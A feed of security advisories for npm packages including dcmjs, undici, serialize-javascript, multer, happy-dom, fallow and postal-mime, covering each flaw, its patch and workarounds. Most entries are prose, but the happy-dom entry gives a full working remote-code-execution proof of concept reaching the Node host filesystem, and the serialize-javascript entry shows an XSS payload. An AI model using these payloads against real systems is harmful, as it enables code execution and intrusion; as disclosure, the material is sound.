entry.title: [dcmjs] dcmjs: DS/IS VALUE REPRESENTATION INPUT VALIDATION BYPASS
entry.content:
dcmjs, a JavaScript library for DICOM manipulation used in web-based medical imaging viewers, contains an input validation bypass in its handling of DS (Decimal String) and IS (Integer String) value representations.

The DecimalString and IntegerString classes in ValueRepresentation.js use a regex sanitizer followed by JavaScript's Number() constructor. While the regex strips direct NaN/Infinity strings, it preserves scientific notation (including the 'e' character), enabling:

  1. Infinity injection via scientific notation overflow (1e999999)
  2. NaN injection via sign-only remnants from stripped inf strings ("-inf" -> "-")
  3. IS accepting scientific notation in violation of PS3.5

AFFECTED PRODUCT

Product: dcmjs (JavaScript DICOM manipulation library) Repository: https://github.com/dcmjs-org/dcmjs npm: https://www.npmjs.com/package/dcmjs Affected Versions: < 0.52.0 (patched in 0.52.0, released 2026-05-19) CVE: CVE-2026-46350 (assigned by GitHub 2026-05-13) CWE: CWE-20 (Improper Input Validation) CVSS Score: 7.5 (HIGH) CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H Maintainer note: The CVSS score above is the reporter's assessment; dcmjs rates this low, because malformed input produces NaN/Infinity in values the caller must range-check in any case (both are reachable by other means, and no trust boundary enforced by dcmjs is crossed).

DOWNSTREAM IMPACT

dcmjs is a foundational library used by:

  • OHIF Viewer (Open Health Imaging Foundation)
  • Cornerstone.js ecosystem
  • DICOMweb client/server implementations
  • Research and clinical web-based PACS viewers
  • Any Node.js or browser application parsing DICOM via dcmjs

ROOT CAUSE

In src/ValueRepresentation.js, both DecimalString and IntegerString use:

let returnVal = numberStr.trim().replace(/[^0-9.\\\-+e]/gi, "");
return returnVal === "" ? null : Number(returnVal);

The regex /[^0-9.\-+e]/gi strips characters NOT in the set {0-9, ., , -, +, e, E}. This provides partial defense: direct "NaN" and "Infinity" strings are stripped to empty/null. However:

(a) Scientific notation is fully preserved because 'e', digits, '+', '-', '.' all pass the regex. "1e999999" passes intact, and Number("1e999999") returns JavaScript Infinity.

(b) The string "-inf" is stripped to just "-" (only the minus passes the regex). Number("-") returns JavaScript NaN.

(c) IntegerString uses the SAME regex/logic as DecimalString, meaning IS accepts scientific notation ("1e5" -> 100000) in violation of PS3.5 Section 6.2, which restricts IS to characters 0-9, +, -.

(d) No range validation exists for IS values (PS3.5 requires [-2^31, 2^31-1]) or DS values (16-character max, fixed/floating-point only).

VULNERABILITY DETAILS

Attack Vector 1: Infinity via Scientific Notation Overflow

Input: DS or IS field containing "1e999999" Regex: Passes (all chars in allowed set) Result: Number("1e999999") -> Infinity Impact: Infinity propagates through all downstream arithmetic

Attack Vector 2: Negative Infinity via Scientific Notation

Input: DS or IS field containing "-1e999999" Regex: Passes Result: Number("-1e999999") -> -Infinity Impact: Negative Infinity in spatial/dosimetric calculations

Attack Vector 3: NaN via Sign-Only Remnant

Input: DS or IS field containing "-inf" Regex: Strips to "-" Result: Number("-") -> NaN Impact: NaN propagates silently through arithmetic (IEEE 754)

Attack Vector 4: NaN via Plus-Only Remnant

Input: DS or IS field containing "+inf" Regex: Strips to "+" Result: Number("+") -> NaN Impact: Same as above

Attack Vector 5: IS Scientific Notation Bypass

Input: IS field containing "1e5" Regex: Passes Result: Number("1e5") -> 100000 Impact: Integer fields accept non-integer representation, violating PS3.5

Attack Vector 6: IS Extreme Overflow

Input: IS field containing "1e18" Regex: Passes Result: Number("1e18") -> 1000000000000000000 Impact: Far exceeds IS range [-2^31, 2^31-1], no bounds check

CLINICAL IMPACT

dcmjs is used in web-based DICOM viewers and processing pipelines. Corrupted values affect:

  • PixelSpacing / ImagePositionPatient: Spatial geometry corruption prevents accurate measurement and registration in web viewers

  • WindowCenter / WindowWidth: Display pipeline corruption makes images unreadable (all black or all white)

  • DoseGridScaling / NumberOfFrames: Radiation therapy dose display errors and denial of service via frame count overflow

  • RescaleSlope / RescaleIntercept: Hounsfield unit conversion produces invalid values, corrupting quantitative analysis

  • SliceThickness: Volume reconstruction fails in multiplanar reformats

References

  • https://github.com/dcmjs-org/dcmjs/security/advisories/GHSA-px68-xx5g-48q5
  • https://github.com/dcmjs-org/dcmjs/commit/81e7e11cdefb56aa1a65bfe259648b865583ff88
  • https://github.com/dcmjs-org/dcmjs/releases/tag/v0.52.0
  • https://github.com/advisories/GHSA-px68-xx5g-48q5

entry.title: [postcss-selector-parser] PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion
entry.content:
Impact

. and # are not word delimiters in the tokenizer, so a flat selector such as .a.a.a... reaches splitWord() as a single word token carrying n class or id indexes. Three passes scanned those index arrays linearly for every index, making the parse O(n^2) in the number of indexes rather than in input length: uniqs(), the indices.forEach loop, and the Sass-interpolation filter. Parsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a single thread. A benign selector of identical byte size parses in tens of milliseconds, so the cost is driven by the index count, not the input size. The nesting depth of such a selector is 0, so the maxNestingDepth guard added in 7.1.3 offers no protection.

Reachability is deployment dependent. Only consumers that parse untrusted, attacker-supplied selectors synchronously in a request path are exposed, for example CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary build-time use on trusted sources is not affected.

Patches

Fixed in 7.1.6. The three passes now use Set membership tests, making parsing linear in the number of indexes. There is no behaviour change: parsing is byte-identical on a differential corpus of 8413 selectors.

Workarounds

Cap the size of selectors accepted from untrusted sources before parsing.

References

  • https://github.com/postcss/postcss-selector-parser/security/advisories/GHSA-rj75-hqrm-r3gf
  • https://nvd.nist.gov/vuln/detail/CVE-2026-104844
  • https://github.com/postcss/postcss-selector-parser/commit/62b191792df0a0bc56062e5a875bc74aae2a51cd
  • https://github.com/postcss/postcss-selector-parser/releases/tag/7.1.6
  • https://github.com/postcss/postcss-selector-parser/pull/346

entry.title: [@azure/msal-node] MSAL Node authorization code flow may disclose parameters to an attacker-controlled endpoint
entry.content:
Impact

Origin validation error in Microsoft Authentication Library (MSAL) for Node.js allows an unauthorized attacker to disclose information over a network. This affects the auth_code flow.

Patches

Version 7.1.0 and higher are patched.

Workarounds

Ensure you pass in only the auth_code to to acquireTokenByCode

entry.title: [undici] undici vulnerable to Denial of Service via unhandled error on excessive content-encodings
entry.content:
Impact

undici's fetch() crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled error and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the fetch() rejection. undici 6.x, 7.x, and 8.x are affected.

Patches

Upgrade to 6.29.1, 7.30.1, or 8.12.2. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.

Workarounds

None.

References

  • https://github.com/nodejs/undici/security/advisories/GHSA-xjj6-f33q-929c
  • https://nvd.nist.gov/vuln/detail/CVE-2026-109869

entry.title: [undici] undici vulnerable to Denial of Service via unbounded memory in the EventSource parser
entry.content:
Impact

undici's EventSource client can be driven to exhaust process memory by a malicious or compromised Server-Sent Events peer. By sending millions of tiny completed data: fields with no blank event separator, or a single unfinished line split across many chunks, the parser retains a growing amount of per-field and per-chunk state. The byte-based maxEventSize and maxResponseSize limits do not bound that retained state, and maxResponseSize is enforced on the compressed body before decompression, so a small compressed response can expand into enough retained memory to terminate the process. The application only needs to maintain an EventSource connection to an untrusted peer, which controls only the response. Availability is the only impact.

Patches

Upgrade to 6.29.1, 7.30.1, or 8.12.2, which bound the retained EventSource parser state (the number of data fields and buffered chunks, the unfinished-line length, and per-field byte totals) independently of the byte limits.

Workarounds

None.

References

  • https://github.com/nodejs/undici/security/advisories/GHSA-4qv8-2p9j-2685

entry.title: [undici] undici vulnerable to Subresource Integrity bypass via non-lowercase algorithm tokens
entry.content:
Impact

undici's fetch() verifies Subresource Integrity (SRI) metadata by looking up the algorithm token in a lowercase-only set, but the SRI specification defines a valid token by its ASCII-lowercase form. A correct but non-lowercase token such as SHA256-... or Sha256-... is therefore treated as unknown and skipped. When no recognized algorithm remains, undici treats the integrity list as empty and accepts the response, so a server that returns a body different from the pinned digest passes the check.

An application that pins a response with a valid uppercase or mixed-case SRI token receives attacker-controlled bytes with no integrity error. The attacker needs only to control the response body, not the application's integrity metadata. The issue affects response integrity only. The regression was introduced in undici 7.15.0; releases 7.14.0 and earlier lowercase the token and are not affected.

Patches

Upgrade to 7.30.1 or 8.12.2. undici now normalizes the algorithm token to ASCII lowercase before validating it and before selecting the strongest algorithm, so case variants of SHA-256, SHA-384, and SHA-512 are verified correctly.

Workarounds

Use lowercase algorithm tokens (sha256, sha384, sha512) in integrity metadata.

References

  • https://github.com/nodejs/undici/security/advisories/GHSA-f72v-6w45-q472
  • https://nvd.nist.gov/vuln/detail/CVE-2026-109841

entry.title: [serialize-javascript] Serialize JavaScript: Cross-site scripting (XSS) via unescaped </script at the end of a serialized function body
entry.content:
Impact

serialize-javascript escapes its output so it is safe to embed inside a <script> element. Before 7.1.3 that guarantee did not hold for a function value whose source ends in a bare </script.

Each function body is escaped on its own, and a bare </script was only neutralized when followed — within the same body — by a character the HTML tokenizer treats as ending the tag name (TAB, LF, FF, CR, SPACE, / or >). A body ending exactly at </script has no following character, so it was emitted unescaped. The delimiter is then supplied by the surrounding output (for example the newline the space option emits after the value), and a later serialized value can supply the closing > followed by markup:

const serialize = require('serialize-javascript');
function f() {} f.toString = () => 'function f(){ return 1 }//</script';
function g() {} g.toString = () => 'function g(x){ return x } > <img src=x onerror=alert(1)>';
serialize({ a: { f }, g }, { space: 2 });
// {
//   "a": {
//     "f": function f(){ return 1 }//</script
//   },
//   "g": function g(x){ return x } > <img src=x onerror=alert(1)>
// }

Embedded in a <script> element, the script ends at the injected tag and the <img> becomes a live element in the page.

Exploitation requires an attacker to control the source text of a serialized function, in practice through a spoofed toString(). Real functions always end in }, so ordinary function values are not affected, and non-function values (including strings containing </script) are escaped correctly.

Patches

Fixed in 7.1.3 (#235). The bare </script form is now also matched at the end of the function body, so it is escaped regardless of what follows it in the output.

Workarounds

Upgrade to 7.1.3. If you cannot upgrade, do not serialize function values whose source text (or toString()) can be influenced by an attacker.

entry.title: [multer] multer vulnerable to Denial of Service via a pending asynchronous fileFilter after request teardown
entry.content:
Impact

When multer is configured with an asynchronous fileFilter, a single request can crash the Node.js process. If a request is aborted (for example when one file is rejected) while another file's async fileFilter is still pending, the pending callback later resumes a parsing stream that multer has already torn down. busboy then emits an error on a stream that no longer has an error listener, which Node raises as an unhandled 'error' event, and the process exits. A single unauthenticated request is enough, so any application using multer with an asynchronous fileFilter is affected, regardless of storage engine. Uploads using a synchronous fileFilter are not affected.

Patches

Users should upgrade to multer 2.5.0 or later.

Workarounds

Use a synchronous fileFilter.

entry.title: [happy-dom] Happy DOM: Incomplete fix for CVE-2026-33943: unsanitized import alias leads to host code execution
entry.content:
Summary

The ESM compiler in happy-dom@20.14.5 does not validate imported local binding aliases before interpolating them into generated JavaScript.

As a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.

This appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates importName in the local export { ... } handler, but the named import handler still places an unvalidated alias directly into code context.

These issues were confirmed through the public Window and <script type="module"> APIs using the published happy-dom npm package. The PoC reaches the Node.js host process, obtains node:fs, and creates a proof directory on the host filesystem.

Confirmed affected versions

The PoC was directly tested against:

  • happy-dom@17.0.0
  • happy-dom@20.0.0
  • happy-dom@20.1.0
  • happy-dom@20.14.5

The same PoC does not trigger on happy-dom@16.8.1.

The ESM compiler was introduced by commit 7bc831df2, first released in v17.0.0. The vulnerable interpolation remains present through v20.14.5, the latest release at the time of testing.

Suggested affected range:

>= 17.0.0, <= 20.14.5

No patched version is currently available.

Preconditions

  • JavaScript evaluation is enabled with enableJavaScriptEvaluation: true.
  • Attacker-controlled HTML or module source is processed by Happy DOM.
  • This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.

Technical details

In packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts, the named import handler splits an import specifier and extracts its alias:

const nameParts = part.trim().split(/\s+as\s+/);
const alias = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
const name = nameParts[0].replace(/["']/g, '');

if (alias && name) {
  properties.push({ name, alias });
}

Unlike the patched export { ... } handler, the value of alias is not validated as a JavaScript identifier.

It is subsequently inserted directly into generated binding syntax:

newCodeStart += `let {${properties
  .map((property) =>
    property.alias
      ? `"${property.name}": ${property.alias}`
      : property.name
  )
  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;

Consider the following source:

import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };

This is invalid ECMAScript module syntax. Node.js rejects it at the = token.

Happy DOM instead transforms it into the equivalent of:

let {
  "missing": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} = $happy_dom.imports.get('https://poc.local/dep.json');

This generated JavaScript is valid. Because the imported JSON object does not contain a missing property, the default initializer executes.

The with { type: 'json' } attribute is relevant because the compiler only generates its circular import resolver for ESM imports:

if (!match[7] || match[7] === 'esm') {
  resolvableCircularImports.push({ url, properties });
}

Using a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.

Backtick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:

globalThis.constructor.constructor(`return process`)()
  .getBuiltinModule(`node:fs`)
  .mkdirSync(
    globalThis.constructor.constructor(`return process`)().cwd() +
      `/HAPPY_DOM_RCE_PROOF`
  )

Proof of concept

The following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named HAPPY_DOM_RCE_PROOF.

1. Create package.json

{
  "name": "happy-dom-import-alias-rce-poc",
  "private": true,
  "type": "module",
  "dependencies": {
    "happy-dom": "20.14.5"
  }
}

2. Create dep.json

{}

3. Create payload.mjs

This file is used as a control to demonstrate that a native ECMAScript parser rejects the source:

import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };

4. Create poc.mjs

import { Window } from 'happy-dom';
import { existsSync, rmSync } from 'node:fs';
import { resolve } from 'node:path';

const proofDirectory = resolve('HAPPY_DOM_RCE_PROOF');
rmSync(proofDirectory, { recursive: true, force: true });

const window = new Window({
  url: 'https://poc.local/',
  settings: {
    enableJavaScriptEvaluation: true,
    suppressCodeGenerationFromStringsWarning: true,
    fetch: {
      virtualServers: [
        {
          url: 'https://poc.local/',
          directory: process.cwd()
        }
      ]
    }
  }
});

const script = window.document.createElement('script');
script.type = 'module';

script.textContent = `
  import {
    missing as injected = globalThis.constructor.constructor(\`return process\`)()
      .getBuiltinModule(\`node:fs\`)
      .mkdirSync(
        globalThis.constructor.constructor(\`return process\`)().cwd() +
        \`/HAPPY_DOM_RCE_PROOF\`
      )
  } from './dep.json' with { type: 'json' };
`;

window.document.body.appendChild(script);
await window.happyDOM.waitUntilComplete();

if (!existsSync(proofDirectory)) {
  console.error('[-] Exploit failed: proof directory was not created.');
  console.error(
    window.happyDOM.virtualConsolePrinter.readAsString()
  );
  process.exitCode = 1;
} else {
  console.log(`[+] Host filesystem reached: ${proofDirectory}`);
}

await window.happyDOM.close();

5. Run the control test

npm install
node --check payload.mjs

Expected result:

SyntaxError: Unexpected token '='

This confirms that the source is not valid ESM.

6. Run the Happy DOM PoC

node poc.mjs

Expected result:

[+] Host filesystem reached: /path/to/HAPPY_DOM_RCE_PROOF

The existence of HAPPY_DOM_RCE_PROOF confirms that the expression injected through the import alias executed and reached the host filesystem.

The PoC was also verified inside a node:24-alpine Docker container, where it created:

/poc/HAPPY_DOM_RCE_PROOF

Impact

An attacker who can supply module source to an application that evaluates JavaScript through Happy DOM can cause syntactically invalid import declarations to be transformed into executable JavaScript.

This may bypass upstream syntax validation or application assumptions that malformed import clauses will be rejected.

The demonstrated payload reaches Node.js process and built-in modules. It can therefore be adapted to read or modify files, access environment data, or execute operating-system commands with the privileges of the Happy DOM host process.

Relationship to CVE-2026-33943

CVE-2026-33943 covers expression injection through a local export declaration:

export { attacker_expression }

Its fix added identifier validation to the importName used by the export { ... } handler:

if (
  exportName &&
  importName &&
  VALID_VARIABLE_NAME_REGEXP.test(importName)
) {
  // ...
}

This report uses a different parsing and code-generation path:

import { name as malicious_alias } from './module';

The unvalidated value is the local import alias, and the injection occurs in a generated destructuring binding rather than the export assignment patched by CVE-2026-33943.

The issue remains reproducible in versions released after the CVE-2026-33943 fix, including 20.14.5.

Suggested fix

Validate the imported local binding before placing it into code context. The existing VALID_VARIABLE_NAME_REGEXP can be reused:

- if (alias && name) {
+ if (alias && name && VALID_VARIABLE_NAME_REGEXP.test(alias)) {

A regression test should compile and execute the malicious import declaration, then verify that the initializer was not evaluated.

This change was tested locally. The focused ECMAScriptModuleCompiler test suite passes with 30 tests, and ESLint reports no errors.

For additional hardening, generated property keys should use JSON.stringify() instead of manual quote interpolation.

Verification record

  • Testing date: 2026-09-17
  • Duplicate check updated: 2026-09-20
  • Platform: Windows 11
  • Node.js: 24.14.1
  • Latest tested package: happy-dom@20.14.5
  • Source tag: v20.14.5
  • Source commit: 0d4cdbe7442af49d16b49ddf1acf7cc9684ed318
  • First confirmed affected version: 17.0.0
  • Confirmed unaffected version: 16.8.1
  • Docker environment: Node 24 Alpine
  • No matching public advisory, issue, pull request, commit, or release was found during the duplicate check.

References

  • https://github.com/capricorn86/happy-dom/security/advisories/GHSA-834v-8h66-3h79
  • https://github.com/capricorn86/happy-dom/pull/2537
  • https://github.com/capricorn86/happy-dom/commit/fd163520b74d9fa146be91f7b4e4f46d6cccbe13
  • https://github.com/capricorn86/happy-dom/releases/tag/v21.0.4
  • https://github.com/advisories/GHSA-834v-8h66-3h79

entry.title: [@fallow-cli/fallow-node] Fallow: A `.*` glob segment let an analyzed repository make Fallow test paths in the parent of the project root
entry.content:
Impact

Fallow expands some globs from the analyzed repository on disk. Before 3.34.0, a segment such as .*, .? or ..* in such a glob also matched the special .. entry. The glob crate tests .. against a segment that starts with a literal .. Fallow validates plugin glob patterns and refuses absolute paths and .. segments, but these segments passed that validation.

The attacker controls the repository content. The attacker must also be able to read the Fallow output, for example a CI log or a pull request comment. Then the attacker can learn if a file or directory exists in the parent of the project root:

  • A plugin fileExists detection pattern such as .*/marker.json made the plugin active when marker.json existed in the parent directory.
  • An external plugin configPatterns or alwaysUsed pattern could match a config file in the parent directory. When the plugin was active and declared toolingDependencies, the tooling detection credited the related dev dependency. An unused dependency finding could then disappear, and --trace-dependency printed the outside path.
  • fallow plugin-check reported path_exists: true for a seeded entry that matched only in the parent directory.

Fallow tested only that these paths exist. It did not read or print the content of a file outside the project root through these globs.

The Jest, Vitest and Rstest project globs had the same .* problem, and the Jest and Vitest ones also read file content. GHSA-jfwm-3p3c-6hx5 describes that case.

Patches

Fixed in 3.34.0. Fallow now rewrites a leading . in a wildcard segment to [.] before it expands the glob on disk. [.] matches the same hidden files and directories inside the project root. The glob crate does not test .. against it.

Workarounds

Run Fallow only on repositories that you trust. Before you run Fallow on another repository, check the detection, configPatterns and alwaysUsed patterns of its plugin files.

References

  • https://github.com/fallow-rs/fallow/security/advisories/GHSA-h4fr-cmh5-qr62
  • https://github.com/fallow-rs/fallow/pull/3548
  • https://github.com/fallow-rs/fallow/commit/133d4c862c74f4b1f0a7417c65b7157c1144294d
  • https://github.com/fallow-rs/fallow/releases/tag/v3.34.0
  • https://github.com/advisories/GHSA-h4fr-cmh5-qr62

entry.title: [@fallow-cli/fallow-node] Fallow: Jest and Vitest `projects` entries let an analyzed repository make Fallow read files outside the project root
entry.content:
Impact

Fallow reads the Jest and Vitest configs of the repository that it analyzes. A Jest projects entry or a Vitest test.projects entry can name a path. Fallow followed such an entry to a config file and read that file, also when the file was outside the project root. These forms reached outside the root:

  • an absolute path or glob, for example /etc/*;
  • a path with .. segments, for example ../*;
  • a glob with a .* segment, because the glob crate also tests .. against a segment that starts with a literal .;
  • a symlink in the project root to a directory above it;
  • the extends path of a Vitest inline project;
  • a script --config path that is a symlink to a file outside the project root.

Fallow parsed each of these files as a test runner config. Fallow used the content only to credit dependencies, setup files and JSX import sources. Thus unused dependency and unused file findings could change. Fallow did not print the content or send it over the network.

The Fallow threat model states that analysis reads only inside the project root. A crafted repository could make Fallow read files that the user did not expect. Such a read can happen in CI, or when an agent runs Fallow on a cloned repository. The attacker gets changed findings, not the file content.

Versions 2.68.0 to 3.33.1 read outside files through Jest projects. Version 3.33.1 also read them through Vitest test.projects.

Patches

Fixed in 3.34.0. Fallow now resolves each match with symlinks and .. segments removed. Fallow reads the match only when it is inside the project root. A glob whose literal base is outside the project root does not run. The boundary is the project root, so an in-root entry such as <rootDir>/../packages/* still works, also from the config of a workspace package. Fallow also does not read a script --config path that is a symlink to a file outside the project root.

Workarounds

Run Fallow only on repositories that you trust. Before you run Fallow on another repository, check the projects entries of its jest.config.* and vitest.config.* files.

References

  • https://github.com/fallow-rs/fallow/security/advisories/GHSA-jfwm-3p3c-6hx5
  • https://nvd.nist.gov/vuln/detail/CVE-2026-115569
  • https://github.com/fallow-rs/fallow/pull/3556
  • https://github.com/fallow-rs/fallow/commit/75c0c60948a53ddfe042e65b446343989f4c5649
  • https://github.com/fallow-rs/fallow/releases/tag/v3.34.0

entry.title: [postal-mime] postal-mime: Quadratic CPU consumption when decoding a header of many joinable RFC 2047 base64 encoded words
entry.content:
Impact

Decoding a header that holds a long run of joinable RFC 2047 base64 encoded words, such as =?utf-8?B?QUJD?= repeated tens of thousands of times in a Subject, From, To, a filename or a description, took time quadratic in the number of words. The join check ran a regex over the text joined so far for every word, which flattens the accumulated string each time. A single well formed message of about 1.6 MB blocked the event loop for one to twenty seconds depending on the host, and inline message/rfc822 parts multiplied the cost, since each nested message carried its own header budget.

Any application that parses untrusted mail with postal-mime 3.0.0 through 4.0.7, including the exported decodeWords() helper, is affected. There is no confidentiality or integrity impact.

Patches

Fixed in 4.0.8. The pad check now tracks the last appended word instead of testing the joined text, so decoding is linear in the header length. The same release also counts the parts and header bytes of inline message/rfc822 sub-messages against the limits of the message as a whole, counts every header line for at least 64 bytes of maxHeadersSize, and adds a scaling test that measures every stage of the parser at two input sizes.

Workarounds

Lower maxHeadersSize from its 2 MiB default to bound the cost per message, or parse untrusted mail in a worker that can be terminated.

Credits

Reported by Felipe Fernández.

References

  • https://github.com/postalsys/postal-mime/security/advisories/GHSA-f2hq-32vh-53cc
  • https://github.com/postalsys/postal-mime/commit/9eb25a66bb3cc8b631421be651b9648796f19136
